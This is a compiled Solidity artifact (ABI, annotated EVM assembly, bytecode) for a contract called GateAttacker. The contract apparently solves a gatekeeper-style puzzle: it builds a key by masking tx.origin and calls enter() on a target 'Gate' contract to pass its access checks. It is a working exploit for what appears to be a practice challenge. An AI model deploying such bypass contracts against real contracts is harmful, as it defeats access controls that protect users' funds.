{
	"contract/security/GateAttacker.sol": {
		"GateAttacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "addr",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "c1",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "c2",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "c3",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getAddress",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contract/security/GateAttacker.sol\":111:852  contract GateAttacker{\r... */\n  mstore(0x40, 0x80)\n    /* \"contract/security/GateAttacker.sol\":174:192  0xFFFFFFFF0000FFFF */\n  0xffffffff0000ffff\n    /* \"contract/security/GateAttacker.sol\":158:192  uint64 offset = 0xFFFFFFFF0000FFFF */\n  0x00\n  exp(0x0100, 0x14)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/GateAttacker.sol\":227:296  constructor(address addr) public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"contract/security/GateAttacker.sol\":283:287  addr */\n  dup1\n    /* \"contract/security/GateAttacker.sol\":271:275  impl */\n  0x00\n  dup1\n    /* \"contract/security/GateAttacker.sol\":271:288  impl = Gate(addr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/GateAttacker.sol\":227:296  constructor(address addr) public {\r... */\n  pop\n    /* \"contract/security/GateAttacker.sol\":111:852  contract GateAttacker{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/GateAttacker.sol\":111:852  contract GateAttacker{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x38cc4831\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x48e257cb\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x5f57697c\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xf2c07be5\n      eq\n      tag_7\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contract/security/GateAttacker.sol\":304:401  function getAddress() public {\r... */\n    tag_3:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"contract/security/GateAttacker.sol\":533:649  function c2() public view returns (bool){\r... */\n    tag_4:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/GateAttacker.sol\":409:525  function c1() public view returns (bool){\r... */\n    tag_5:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/GateAttacker.sol\":781:849  function attack() public {\r... */\n    tag_6:\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      stop\n        /* \"contract/security/GateAttacker.sol\":657:773  function c3() public view returns (bool) {\r... */\n    tag_7:\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/GateAttacker.sol\":304:401  function getAddress() public {\r... */\n    tag_9:\n        /* \"contract/security/GateAttacker.sol\":386:392  offset */\n      0x00\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffff\n      and\n        /* \"contract/security/GateAttacker.sol\":373:382  tx.origin */\n      origin\n        /* \"contract/security/GateAttacker.sol\":366:392  uint64(tx.origin) & offset */\n      and\n        /* \"contract/security/GateAttacker.sol\":359:393  bytes8(uint64(tx.origin) & offset) */\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":344:356  changedValue */\n      0x01\n      0x00\n        /* \"contract/security/GateAttacker.sol\":344:393  changedValue = bytes8(uint64(tx.origin) & offset) */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xc0\n      shr\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contract/security/GateAttacker.sol\":304:401  function getAddress() public {\r... */\n      jump\t// out\n        /* \"contract/security/GateAttacker.sol\":533:649  function c2() public view returns (bool){\r... */\n    tag_11:\n        /* \"contract/security/GateAttacker.sol\":568:572  bool */\n      0x00\n        /* \"contract/security/GateAttacker.sol\":628:640  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":621:641  uint64(changedValue) */\n      0xc0\n      shr\n        /* \"contract/security/GateAttacker.sol\":591:641  uint32(uint64(changedValue))!=uint64(changedValue) */\n      0xffffffffffffffff\n      and\n        /* \"contract/security/GateAttacker.sol\":605:617  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":598:618  uint64(changedValue) */\n      0xc0\n      shr\n        /* \"contract/security/GateAttacker.sol\":591:641  uint32(uint64(changedValue))!=uint64(changedValue) */\n      0xffffffff\n      and\n      eq\n      iszero\n        /* \"contract/security/GateAttacker.sol\":584:641  return uint32(uint64(changedValue))!=uint64(changedValue) */\n      swap1\n      pop\n        /* \"contract/security/GateAttacker.sol\":533:649  function c2() public view returns (bool){\r... */\n      swap1\n      jump\t// out\n        /* \"contract/security/GateAttacker.sol\":409:525  function c1() public view returns (bool){\r... */\n    tag_13:\n        /* \"contract/security/GateAttacker.sol\":444:448  bool */\n      0x00\n        /* \"contract/security/GateAttacker.sol\":504:516  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":497:517  uint64(changedValue) */\n      0xc0\n      shr\n        /* \"contract/security/GateAttacker.sol\":467:517  uint32(uint64(changedValue))!=uint64(changedValue) */\n      0xffffffffffffffff\n      and\n        /* \"contract/security/GateAttacker.sol\":481:493  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":474:494  uint64(changedValue) */\n      0xc0\n      shr\n        /* \"contract/security/GateAttacker.sol\":467:517  uint32(uint64(changedValue))!=uint64(changedValue) */\n      0xffffffff\n      and\n      eq\n      iszero\n        /* \"contract/security/GateAttacker.sol\":460:517  return uint32(uint64(changedValue))!=uint64(changedValue) */\n      swap1\n      pop\n        /* \"contract/security/GateAttacker.sol\":409:525  function c1() public view returns (bool){\r... */\n      swap1\n      jump\t// out\n        /* \"contract/security/GateAttacker.sol\":781:849  function attack() public {\r... */\n    tag_15:\n        /* \"contract/security/GateAttacker.sol\":817:821  impl */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/GateAttacker.sol\":817:827  impl.enter */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3370204e\n        /* \"contract/security/GateAttacker.sol\":828:840  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":817:841  impl.enter(changedValue) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_22:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_24:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/GateAttacker.sol\":781:849  function attack() public {\r... */\n      jump\t// out\n        /* \"contract/security/GateAttacker.sol\":657:773  function c3() public view returns (bool) {\r... */\n    tag_17:\n        /* \"contract/security/GateAttacker.sol\":692:696  bool */\n      0x00\n        /* \"contract/security/GateAttacker.sol\":755:764  tx.origin */\n      origin\n        /* \"contract/security/GateAttacker.sol\":716:765  uint32(uint64(changedValue)) == uint16(tx.origin) */\n      0xffff\n      and\n        /* \"contract/security/GateAttacker.sol\":730:742  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":723:743  uint64(changedValue) */\n      0xc0\n      shr\n        /* \"contract/security/GateAttacker.sol\":716:765  uint32(uint64(changedValue)) == uint16(tx.origin) */\n      0xffffffff\n      and\n      eq\n        /* \"contract/security/GateAttacker.sol\":709:765  return uint32(uint64(changedValue)) == uint16(tx.origin) */\n      swap1\n      pop\n        /* \"contract/security/GateAttacker.sol\":657:773  function c3() public view returns (bool) {\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa26469706673582212205926e85ba2338796a778e80db5f7802c6e5a45655706c4a657b5cc8af121873964736f6c634300060c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405267ffffffff0000ffff600060146101000a81548167ffffffffffffffff021916908367ffffffffffffffff16021790555034801561004157600080fd5b506040516103893803806103898339818101604052602081101561006457600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506102c4806100c56000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806338cc48311461005c57806348e257cb146100665780635f57697c146100865780639e5faafc146100a6578063f2c07be5146100b0575b600080fd5b6100646100d0565b005b61006e61010f565b60405180821515815260200191505060405180910390f35b61008e61014e565b60405180821515815260200191505060405180910390f35b6100ae61018d565b005b6100b8610268565b60405180821515815260200191505060405180910390f35b600060149054906101000a900467ffffffffffffffff16321660c01b600160006101000a81548167ffffffffffffffff021916908360c01c0217905550565b6000600160009054906101000a900460c01b60c01c67ffffffffffffffff16600160009054906101000a900460c01b60c01c63ffffffff161415905090565b6000600160009054906101000a900460c01b60c01c67ffffffffffffffff16600160009054906101000a900460c01b60c01c63ffffffff161415905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633370204e600160009054906101000a900460c01b6040518263ffffffff1660e01b8152600401808277ffffffffffffffffffffffffffffffffffffffffffffffff19168152602001915050602060405180830381600087803b15801561022a57600080fd5b505af115801561023e573d6000803e3d6000fd5b505050506040513d602081101561025457600080fd5b810190808051906020019092919050505050565b60003261ffff16600160009054906101000a900460c01b60c01c63ffffffff161490509056fea26469706673582212205926e85ba2338796a778e80db5f7802c6e5a45655706c4a657b5cc8af121873964736f6c634300060c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH8 0xFFFFFFFF0000FFFF PUSH1 0x0 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH8 0xFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH8 0xFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x389 CODESIZE SUB DUP1 PUSH2 0x389 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x2C4 DUP1 PUSH2 0xC5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x38CC4831 EQ PUSH2 0x5C JUMPI DUP1 PUSH4 0x48E257CB EQ PUSH2 0x66 JUMPI DUP1 PUSH4 0x5F57697C EQ PUSH2 0x86 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xA6 JUMPI DUP1 PUSH4 0xF2C07BE5 EQ PUSH2 0xB0 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x64 PUSH2 0xD0 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6E PUSH2 0x10F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x8E PUSH2 0x14E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xAE PUSH2 0x18D JUMP JUMPDEST STOP JUMPDEST PUSH2 0xB8 PUSH2 0x268 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH8 0xFFFFFFFFFFFFFFFF AND ORIGIN AND PUSH1 0xC0 SHL PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH8 0xFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH1 0xC0 SHR MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH8 0xFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ ISZERO SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH8 0xFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ ISZERO SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3370204E PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x22A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x23E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x254 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 ORIGIN PUSH2 0xFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MSIZE 0x26 0xE8 JUMPDEST LOG2 CALLER DUP8 SWAP7 0xA7 PUSH25 0xE80DB5F7802C6E5A45655706C4A657B5CC8AF121873964736F PUSH13 0x634300060C0033000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "141600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"c1()": "1946",
						"c2()": "1924",
						"c3()": "1144",
						"getAddress()": "21886"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"c1()": "5f57697c",
					"c2()": "48e257cb",
					"c3()": "f2c07be5",
					"getAddress()": "38cc4831"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 11,
						"contract": "contract/security/GateAttacker.sol:GateAttacker",
						"label": "impl",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Gate)9"
					},
					{
						"astId": 14,
						"contract": "contract/security/GateAttacker.sol:GateAttacker",
						"label": "offset",
						"offset": 20,
						"slot": "0",
						"type": "t_uint64"
					},
					{
						"astId": 16,
						"contract": "contract/security/GateAttacker.sol:GateAttacker",
						"label": "changedValue",
						"offset": 0,
						"slot": "1",
						"type": "t_bytes8"
					}
				],
				"types": {
					"t_bytes8": {
						"encoding": "inplace",
						"label": "bytes8",
						"numberOfBytes": "8"
					},
					"t_contract(Gate)9": {
						"encoding": "inplace",
						"label": "contract Gate",
						"numberOfBytes": "20"
					},
					"t_uint64": {
						"encoding": "inplace",
						"label": "uint64",
						"numberOfBytes": "8"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}